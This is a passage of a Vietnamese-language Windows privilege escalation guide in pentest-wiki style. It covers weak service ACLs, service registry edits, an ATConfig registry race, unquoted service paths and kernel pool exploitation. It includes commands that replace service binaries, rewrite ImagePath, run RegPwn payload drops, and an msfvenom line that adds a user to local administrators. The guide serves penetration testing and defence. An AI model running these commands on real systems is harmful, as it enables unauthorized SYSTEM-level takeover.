for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Bạn cũng có thể sử dụng **sc** và **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tìm các ACL nguy hiểm được cấp cho **`Everyone`**, **`BUILTIN\Users`** hoặc **`Authenticated Users`**, đặc biệt là **`(F)`**, **`(M)`** hoặc **`(W)`** trên file thực thi của service hoặc thư mục chứa file đó. Một quy trình khai thác thực tế là:<sup>[[27]](#references)</sup>

1. Xác nhận tài khoản service và đường dẫn file thực thi bằng `sc qc <service_name>`.
2. Xác nhận file binary có quyền ghi bằng `icacls <path>`.
3. Thay file binary của service bằng payload hoặc một file binary service độc hại hợp lệ.
4. Khởi động lại service bằng `sc stop <service_name> && sc start <service_name>` (hoặc chờ khởi động lại máy / service trigger).

Các bước kiểm tra tự động hữu ích:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Nếu dịch vụ không cho phép người dùng thông thường khởi động lại, hãy kiểm tra xem dịch vụ có tự khởi động khi boot hay không, có failure action để khởi chạy lại hay không, hoặc có thể được kích hoạt gián tiếp bởi ứng dụng sử dụng dịch vụ đó hay không.

### Quyền chỉnh sửa registry của dịch vụ

Bạn nên kiểm tra xem mình có thể chỉnh sửa registry của dịch vụ nào không.\
Bạn có thể **kiểm tra** **quyền** của mình đối với **registry** của một dịch vụ bằng cách:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Phép kiểm tra quyền ban đầu được nêu như sau:

Cần kiểm tra xem **Authenticated Users** hoặc **NT AUTHORITY\INTERACTIVE** có quyền `FullControl` hay không. Nếu có, có thể sửa đổi binary được service thực thi.

Kiểm tra xem **Authenticated Users** hoặc **NT AUTHORITY\INTERACTIVE** có quyền registry cho phép ghi trên một service key cụ thể hay không. Chỉ riêng một mục ACL không chứng minh được quyền truy cập thực tế: các mục deny, token hiện tại và quyền kế thừa đều có ảnh hưởng. Quyền trên registry key khác với quyền `SERVICE_CHANGE_CONFIG` và `SERVICE_START` trên service object. Việc leo thang còn đòi hỏi có một trường cấu hình service khả dụng, cách kích hoạt service và một danh tính service có đặc quyền cao hơn. Xem [quyền registry key](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) và [tài liệu tham khảo về quyền truy cập service](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) của Microsoft.

Để thay đổi Path của binary được thực thi:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Race symlink Registry để ghi giá trị HKLM tùy ý (ATConfig)

Một số tính năng Accessibility của Windows tạo các khóa **ATConfig** theo từng người dùng, sau đó được một tiến trình **SYSTEM** sao chép vào khóa phiên HKLM. Một **race điều kiện với symbolic link** trong Registry có thể chuyển hướng thao tác ghi có đặc quyền này đến **bất kỳ đường dẫn HKLM nào**, tạo ra primitive **ghi giá trị HKLM** tùy ý.<sup>[[18]](#references)</sup>

Các vị trí khóa (ví dụ: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` liệt kê các tính năng Accessibility đã cài đặt.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` lưu cấu hình do người dùng kiểm soát.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` được tạo trong quá trình đăng nhập/chuyển sang secure desktop và người dùng có thể ghi vào.

Quy trình khai thác (CVE-2026-24291 / ATConfig):

1. Điền giá trị **HKCU ATConfig** bạn muốn SYSTEM ghi.
2. Kích hoạt thao tác sao chép secure desktop (ví dụ: **LockWorkstation**), thao tác này khởi chạy luồng AT broker.
3. **Thắng race** bằng cách đặt một **oplock** trên `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; khi oplock được kích hoạt, thay thế khóa **HKLM Session ATConfig** bằng một **registry link** trỏ đến mục tiêu HKLM được bảo vệ.
4. SYSTEM ghi giá trị do kẻ tấn công chọn vào đường dẫn HKLM đã được chuyển hướng.

Khi đã có khả năng ghi giá trị HKLM tùy ý, chuyển sang LPE bằng cách ghi đè các giá trị cấu hình service:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/dòng lệnh)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chọn một service mà người dùng thông thường có thể khởi động (ví dụ: **`msiserver`**) rồi kích hoạt service đó sau khi ghi giá trị. **Lưu ý:** bản triển khai exploit công khai **khóa workstation** trong quá trình race.

Công cụ mẫu (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Quyền AppendData/AddSubdirectory trên registry của Services

Nếu bạn có quyền này đối với một registry, điều đó có nghĩa là **bạn có thể tạo các registry con từ registry này**. Với Windows services, quyền này **đủ để thực thi mã tùy ý**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Nếu đường dẫn đến tệp thực thi không nằm trong dấu ngoặc kép, Windows sẽ thử thực thi từng phần đường dẫn kết thúc trước dấu cách.

Ví dụ, với đường dẫn _C:\Program Files\Some Folder\Service.exe_, Windows sẽ thử thực thi:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Liệt kê tất cả các đường dẫn dịch vụ không được đặt trong dấu ngoặc kép, ngoại trừ những đường dẫn thuộc về các dịch vụ Windows tích hợp sẵn:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bạn có thể phát hiện và khai thác** lỗ hổng này bằng metasploit: `exploit/windows/local/trusted\_service\_path` Bạn có thể tự tạo binary của service bằng metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Hành động khôi phục

Windows cho phép người dùng chỉ định các hành động sẽ được thực hiện khi một service gặp lỗi. Có thể cấu hình tính năng này để trỏ đến một binary. Nếu có thể thay thế binary đó, thì có thể leo thang đặc quyền. Xem thêm chi tiết trong [tài liệu chính thức](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Đích đến của script trong Scheduled task

Đối với một task đang bật chạy `cmd.exe /c` cùng tệp `.bat` hoặc `.cmd`, hãy kiểm tra script được nêu trong **đối số action** cũng như `cmd.exe`. Điều tương tự áp dụng cho đối số tệp được chỉ định rõ ràng của interpreter, chẳng hạn như PowerShell `-File`. Nếu một batch file được lên lịch có lệnh gọi PowerShell `-File` viết trực tiếp, hãy kiểm tra cả ACL của script được tham chiếu; cần lần theo thủ công các biến, điều kiện và chuỗi lệnh của shell. Script hoặc thư mục cha mà người gọi có quyền ghi chỉ là manh mối để thực thi xuyên tài khoản khi principal được cấu hình cho task khác với người gọi và task thực sự chạy đến action đó. ACL chỉ cho phép ghi nối thêm cũng có thể quan trọng với script, nhưng một lệnh `exit` trước đó hoặc luồng điều khiển khác có thể khiến các dòng được nối thêm không thể chạy tới. Hãy xác nhận ACL hiệu lực, [ngữ cảnh thực thi của task](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), thư mục làm việc, trigger và chính sách kiểm soát ứng dụng trước khi kết luận có thể leo thang đặc quyền. Quá trình kiểm kê không được sửa đổi script hoặc khởi chạy task.

## Named stream trên các tệp có thể truy cập

Trên NTFS, một tệp có thể đọc được có thể chứa named `:$DATA` stream mà nội dung không hiển thị trong danh sách thư mục thông thường. Với một nhóm nhỏ, có liên quan gồm các tệp sao lưu hoặc tệp cấu hình có thể truy cập, hãy xem **tên và kích thước** stream trước khi mở bất kỳ nội dung nào; Windows cung cấp thông tin này qua [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) và PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Tên stream gợi ý có chứa secret chỉ là manh mối. Hãy kiểm tra quyền đọc hiệu lực của tệp, filesystem có hỗ trợ stream hay không, stream có chứa thông tin xác thực sử dụng được không và tài khoản mà chúng thực sự xác thực. Tránh quét stream đệ quy và in nội dung stream trong quá trình liệt kê thông thường.

## Các input của helper trong Windows Driver Kit được lên lịch

Windows Driver Kit tùy chọn có `StandaloneRunner.exe`, có thể sử dụng `command.txt`, `reboot.rsf` và tệp `working\rsf.rsf` của project từ thư mục chạy. Một scheduled task hoặc service khởi chạy helper này bằng tài khoản có đặc quyền có thể biến quyền ghi ở mức đặc quyền thấp vào các input đó thành việc thực thi lệnh trong ngữ cảnh của tài khoản đó, ngay cả khi bản thân executable của helper được bảo vệ. Hãy xác nhận có consumer đặc quyền và **cả hai** tệp sidecar đều có thể được tạo hoặc sửa đổi; chỉ tìm thấy helper là chưa đủ.

Với scheduled task, hãy kiểm tra [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) trong action của task và ACL của hai đường dẫn sidecar. Nếu task không chỉ định thư mục làm việc, thư mục của executable chỉ là manh mối cần xác minh, không phải bằng chứng cho biết task đọc input ở đâu. Điều kiện tiên quyết về tệp làm việc của project cũng phải được đáp ứng. Hãy kiểm tra principal thực tế của task thay vì cho rằng task chạy dưới quyền SYSTEM.

## Ứng dụng

### Ứng dụng đã cài đặt

Kiểm tra **quyền của các binary** (có thể ghi đè một binary để leo thang đặc quyền) và **các thư mục** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Đường dẫn sửa chữa Windows agent của Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) ảnh hưởng đến các phiên bản Checkmk Windows agent cũ hơn, vốn ghi các tệp lệnh vào `C:\Windows\Temp`, rồi thực thi một tệp đã tồn tại và được bảo vệ chống ghi khi thao tác thay thế thất bại. Nhà cung cấp đã khắc phục sự cố trong các phiên bản 2.1.0p40, 2.2.0p23, 2.3.0b1 và 2.4.0b1. Hãy kiểm tra đầy đủ mức bản vá đã cài đặt và xem thao tác agent bị ảnh hưởng có thể chạy hay không; nhãn chỉ ghi nhánh như `2.1` không đủ để xác định hệ thống có bị ảnh hưởng hay không. Khi liệt kê, có thể kiểm tra phiên bản, trạng thái dịch vụ và quyền trên Temp mà không tạo tệp hoặc kích hoạt lệnh của agent.

#### Rà soát dịch vụ SAML của ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) ảnh hưởng đến build 6210 trở xuống của ADSelfService Plus; nhà cung cấp đã khắc phục lỗi trong build 6211. Lỗi chỉ liên quan nếu SAML SSO **đang hoặc đã được** bật. Vì vậy, mục sản phẩm đã cài đặt hoặc đường dẫn dịch vụ chỉ là đầu mối, không phải kết luận về lỗ hổng: hãy xác nhận chính xác build, lịch sử cấu hình SAML, khả năng truy cập dịch vụ qua mạng và tài khoản chạy dịch vụ. Thực thi mã thông qua dịch vụ sẽ kế thừa quyền của tài khoản đó; để thực thi với quyền SYSTEM, cần có một phiên bản chạy dưới quyền SYSTEM. Tệp `OfflineBackup_*.ezip` có thể đọc được trong thư mục Backup của sản phẩm là một đầu mối riêng về bản sao lưu được mã hóa, không phải bằng chứng về thông tin xác thực có thể sử dụng hoặc lỗ hổng SAML này. Trong quá trình liệt kê thông thường, hãy ghi lại đường dẫn và quyền truy cập của tệp mà không giải nén.

#### Ranh giới giữa Jenkins controller và tài khoản domain

Trên Jenkins controller chạy Windows, hãy phân biệt quyền tạo hoặc cấu hình một job với quyền khởi chạy job đó: [Jenkins mô tả đây là các quyền riêng biệt `Job/Create`, `Job/Configure` và `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Lịch đã cấu hình hoặc remote trigger có thể cung cấp một cách khác để chạy build, nhưng hãy xác nhận rằng chúng đã được bật và build thực sự chạy. Việc thực thi sử dụng danh tính của controller hoặc agent được chọn; credential đã lưu chỉ dùng được nếu job có thể truy cập phạm vi của credential đó. Riêng biệt, hãy kiểm tra quyền truy cập vào metadata trong `JENKINS_HOME`: Jenkins lưu thông tin credential và khóa mã hóa trong `credentials.xml`, `secrets/hudson.util.Secret` và `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Chỉ riêng sự hiện diện của các tệp này không tiết lộ mật khẩu; hãy xác minh **quyền đọc các tệp cần thiết** và một đường dẫn riêng để tái sử dụng tài khoản mà không in secret ra đầu ra được chia sẻ. Nếu tài khoản đó có quyền ghi `scriptPath` của đối tượng người dùng AD, hãy xác nhận đường dẫn script có thể ghi được và có một cơ chế đăng nhập thực tế hoặc tác vụ được lên lịch chạy dưới danh tính người dùng mục tiêu trước khi xem đây là khả năng thực thi chéo người dùng. Muốn kiểm soát thêm các group, cần xác minh riêng các quyền AD hiệu lực.

#### Danh tính self-hosted agent của Azure Pipelines

Với dự án Azure DevOps Server hoặc Azure Pipelines, hãy phân biệt quyền **tạo hoặc chỉnh sửa** pipeline với quyền **xếp hàng** pipeline và sử dụng agent pool đã chọn; [Microsoft mô tả riêng quyền pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) và [quyền cấp phép pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Nếu tài khoản có ít quyền hơn có thể gửi một bước script và chạy pipeline đó trên self-hosted Windows agent, bước này sẽ chạy dưới danh tính [tài khoản hệ điều hành đã cấu hình cho agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Trước khi kết luận có chuyển đổi quyền chéo người dùng hoặc lên SYSTEM, hãy xác minh chính xác pipeline, các giới hạn về branch/resource, pool được cấp quyền, job có thể chạy và danh tính dịch vụ của agent. Agent đã cài đặt, vai trò trong dự án hoặc quyền ghi vào repository chỉ là đầu mối; hãy rà soát quyền và metadata dịch vụ cục bộ mà không khởi chạy build trong quá trình liệt kê thụ động.

#### Credential của Microsoft Entra Connect Sync

[Microsoft phân biệt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **tài khoản dịch vụ ADSync**, dùng để chạy dịch vụ đồng bộ và truy cập cơ sở dữ liệu SQL, với **tài khoản connector AD DS**, có quyền trong thư mục tùy thuộc vào các tính năng đồng bộ được cấu hình. Credential của connector được lưu dưới dạng mã hóa trong cơ sở dữ liệu đó; phần khóa được [bảo vệ bằng DPAPI dưới tài khoản dịch vụ ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Chỉ riêng việc có dịch vụ đồng bộ đã cài đặt, một group có tên gợi ý quyền quản trị cục bộ hoặc khả năng truy cập cơ sở dữ liệu không chứng minh được rằng có credential có thể giải mã hoặc có thể leo thang quyền domain. Hãy rà soát riêng quyền đọc thực tế đối với cơ sở dữ liệu, quyền truy cập dịch vụ/khóa, bố cục cài đặt và SQL, danh tính connector đã cấu hình và quyền AD hiệu lực của danh tính đó. Khi liệt kê thông thường, chỉ hiển thị metadata về dịch vụ và quyền truy cập, không truy vấn hoặc in các secret đã lưu.

#### Quyền trên support DLL của printer driver

Printer driver đã cài đặt có thể lưu support DLL trong `C:\ProgramData` và tải chúng trong một tiến trình in có quyền cao hơn. Hãy rà soát ACL của thư mục driver và DLL cụ thể, bao gồm cả thư mục cha và reparse point, ngay cả khi không thể liệt kê printer bằng WMI. Với [lỗi printer driver Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), đường dẫn được báo cáo là `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [bài công bố ban đầu](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) mô tả việc `PrintIsolationHost.exe` tải DLL. ACL cho phép ghi chỉ là một đầu mối: hãy xác minh quyền ghi hiệu lực sau khi xét các mục từ chối, driver liên quan đã cài đặt và tải tệp dưới một danh tính có quyền cao, cũng như liệu driver cập nhật hoặc chương trình bảo mật của nhà cung cấp đã khắc phục vấn đề cài đặt hay chưa. Không suy luận hệ thống có lỗ hổng chỉ dựa vào tên thư mục hoặc phiên bản driver.

### Quyền ghi

Kiểm tra xem bạn có thể sửa đổi tệp cấu hình nào đó để đọc một tệp đặc biệt, hoặc sửa đổi một binary sẽ được tài khoản Administrator thực thi (schedtasks) hay không.

Có thể tìm các quyền yếu trên thư mục/tệp trong hệ thống bằng cách:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/execution khi plugin autoload trong Notepad++

Notepad++ tự động tải mọi plugin DLL trong các thư mục con `plugins`. Nếu có bản portable/bản sao có thể ghi, việc thả một plugin độc hại vào đó sẽ tự động thực thi code bên trong `notepad++.exe` mỗi khi khởi chạy (bao gồm từ `DllMain` và các callback của plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Chạy khi khởi động

**Kiểm tra xem bạn có thể ghi đè registry hoặc binary nào sẽ được người dùng khác thực thi hay không.**\
**Đọc** **trang sau** để tìm hiểu thêm về các **vị trí autorun đáng chú ý để leo thang đặc quyền**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Driver

Tìm các driver **bên thứ ba đáng ngờ/dễ bị tấn công**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Nếu driver cung cấp primitive đọc/ghi kernel tùy ý (thường gặp trong các trình xử lý IOCTL được thiết kế kém), bạn có thể leo thang đặc quyền bằng cách trực tiếp đánh cắp token SYSTEM từ bộ nhớ kernel.<sup>[[13]](#references)</sup> Xem kỹ thuật từng bước tại đây:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Tài liệu liên quan về khai thác kernel Windows:

Với trường hợp ring-buffer ở kernel-mode có các thanh ghi đọc/ghi mà user có thể ghi, xem [biến thể USB MIDI looped-streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Với lỗi race condition trong đó lời gọi dễ bị tổn thương mở một đường dẫn Object Manager do attacker kiểm soát, việc cố ý làm chậm quá trình tra cứu (dùng các thành phần có độ dài tối đa hoặc chuỗi thư mục sâu) có thể kéo dài khoảng thời gian từ microsecond lên hàng chục microsecond:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF trong cancel-safe queue, rò rỉ paged-pool và các pivot I/O ring

Một số chuỗi LPE trên kernel Windows có thể được xây dựng từ hai lỗi riêng lẻ vốn yếu: một **race condition về vòng đời của cancel-safe queue** giải phóng request/CBD trong khi queue lock vẫn đang được giữ, và một lỗi tiết lộ dữ liệu **nhả lock trước khi copy** làm rò rỉ một allocation paged-pool đã được giải phóng trong `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Ghi chú về audit và khai thác:

- **Giải phóng khi đang giữ lock + cancel sau đó**: tìm đường chạy thành công theo thứ tự **Acquire -> CompleteRequest/free -> Release**, trong khi đường cancel thực hiện **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Nếu đường chạy thành công tới `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` trước khi nhả lock CBDQ/CSQ, một thread đang bị chặn trong `NtCancelIoFileEx -> IopCsqCancelRoutine` có thể tiếp tục chạy sau đó và truyền một `PFLT_CALLBACK_DATA` đã bị giải phóng vào callback remove của driver.
- **Tái sử dụng queue object đã giải phóng** bằng một allocation paged-pool cùng kích thước do attacker kiểm soát. Các Data Queue Entry của `NPFS` rất hữu ích vì payload và kích thước có thể kiểm soát, và sau đó bạn có thể thăm dò chúng bằng các thao tác đọc/peek pipe. Nếu object đã giải phóng chứa các liên kết list, hãy ghi đè chúng bằng một **list tuần hoàn gồm các node request giả trong bộ nhớ user** để driver liên tục xử lý các cấu trúc request do attacker định nghĩa thay vì dừng ở list head ban đầu.
- **Nâng cấp một primitive ghi có thể dự đoán**: nếu request giả chuyển hướng một con trỏ context lồng nhau được dùng bởi các thao tác ghi phục vụ bookkeeping (timestamp / QPC / các trường liền kề refcount), bạn có thể có được một primitive ghi kernel **kiểm soát được địa chỉ nhưng không kiểm soát được giá trị**. Trong trường hợp đó, hãy nhắm vào trường **length/size** của một pool object được spray thay vì một con trỏ code/data cuối cùng, rồi duyệt qua các object đã spray cho đến khi object bị làm hỏng tạo ra một **lỗi đọc paged-pool vượt phạm vi**.
- **Mẫu tiết lộ dữ liệu có thể race**: mọi syscall thực hiện `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` đều là ứng viên đáng chú ý. Độ tin cậy tăng lên khi attacker có thể làm bộ đệm được copy lớn hơn (ví dụ bằng cách thêm nhiều mục list/resource để tăng kích thước allocation cuối cùng của serializer), vì thao tác copy dài hơn sẽ mở rộng khoảng thời gian thay thế mà không nhất thiết làm máy bị crash.
- **Mục tiêu nạp lại chứa nhiều con trỏ**: các mảng registered-buffer của Windows **I/O ring** là mục tiêu tiết lộ dữ liệu rất phù hợp vì kích thước paged-pool của chúng do attacker kiểm soát (`8 * regBufferCnt`) và mỗi phần tử là một con trỏ kernel tới `_IOP_MC_BUFFER_ENTRY`. Hãy rò rỉ một trong các mảng này, khôi phục `IORING_OBJECT` bao quanh, rồi làm hỏng **`RegBuffers`** và **`RegBuffersCount`** để các thao tác I/O ring tiếp theo sử dụng các entry do attacker giả mạo và cung cấp khả năng đọc/ghi kernel tùy ý. Nếu primitive ghi duy nhất có được chỉ ghi ra một byte ổn định (ví dụ từ `KUSER_SHARED_DATA+0x14`), hãy dùng **các lần ghi không căn chỉnh chồng lấn** để tạo một con trỏ user lặp byte như `0x0101010101010101`, map nó bằng `VirtualAlloc`, rồi đặt mảng registered-buffer giả mạo tại đó.<sup>[[30]](#references)</sup>

Các dấu hiệu hữu ích khi debug:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Khi đã có arbitrary kernel read/write từ I/O ring bị lỗi, hãy đánh cắp SYSTEM token bằng quy trình hậu khai thác tiêu chuẩn:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitive memory corruption trên registry hive

Các lỗ hổng hive hiện đại cho phép bạn bố trí layout xác định, khai thác các nhánh con HKLM/HKU có thể ghi và chuyển lỗi corruption metadata thành lỗi tràn kernel paged-pool mà không cần driver tùy chỉnh. Tìm hiểu toàn bộ chuỗi tại đây:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion ở chế độ direct của `RtlQueryRegistryValues` từ các path do attacker kiểm soát

Một số driver nhận path registry từ userland, chỉ xác thực rằng đó là chuỗi UTF-16 hợp lệ, rồi gọi `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` với `RTL_QUERY_REGISTRY_DIRECT` vào một biến scalar trên stack như `int readValue`. Nếu thiếu `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` sẽ được diễn giải theo kiểu registry **thực tế**, chứ không phải kiểu mà developer mong đợi.

Điều này tạo ra hai primitive hữu ích:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: path tuyệt đối `\Registry\...` do người dùng kiểm soát cho phép driver truy vấn các key do attacker chọn, làm lộ sự tồn tại thông qua mã trả về/log và đôi khi đọc các giá trị mà caller không thể truy cập trực tiếp.
- **Kernel memory corruption**: đích scalar như `&readValue` bị type confusion thành `REG_QWORD`, `UNICODE_STRING` hoặc buffer nhị phân có kích thước tùy theo kiểu registry value.

Ghi chú khai thác thực tế:

- **Biện pháp giảm thiểu trên Windows 8+**: nếu truy vấn chạm tới **untrusted hive** với `RTL_QUERY_REGISTRY_DIRECT` nhưng không có `RTL_QUERY_REGISTRY_TYPECHECK`, kernel caller sẽ gặp lỗi `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Để duy trì khả năng khai thác, hãy tìm các key **có thể ghi bởi attacker trong trusted system hive** thay vì đặt giá trị dưới `HKCU`.
- **Staging trong trusted hive**: dùng NtObjectManager để liệt kê các nhánh con có thể ghi của `\Registry\Machine`, rồi chạy lại quá trình quét với token **low-integrity** đã được nhân bản để tìm các key có thể truy cập từ sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: thao tác ghi trực tiếp 8 byte vào một `int` 4 byte sẽ làm hỏng dữ liệu liền kề trên stack và có thể ghi đè một phần con trỏ callback/function gần đó.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode yêu cầu `EntryContext` trỏ đến một `UNICODE_STRING`. Nếu code trước tiên nạp một `REG_DWORD` do attacker kiểm soát vào một biến vô hướng trên stack rồi dùng lại cùng buffer đó để đọc chuỗi, attacker sẽ kiểm soát `Length`/`MaximumLength` và tác động một phần đến con trỏ `Buffer`, tạo ra một thao tác ghi kernel được kiểm soát một phần.
- **`REG_BINARY`**: với dữ liệu nhị phân lớn, direct mode coi `LONG` đầu tiên tại `EntryContext` là kích thước buffer có dấu. Nếu lần đọc `REG_DWORD` trước để lại một giá trị **âm** do attacker kiểm soát trong biến vô hướng được dùng lại, truy vấn `REG_BINARY` tiếp theo sẽ sao chép byte của attacker trực tiếp đè lên các slot stack liền kề; đây thường là cách đơn giản nhất để ghi đè hoàn toàn con trỏ callback.

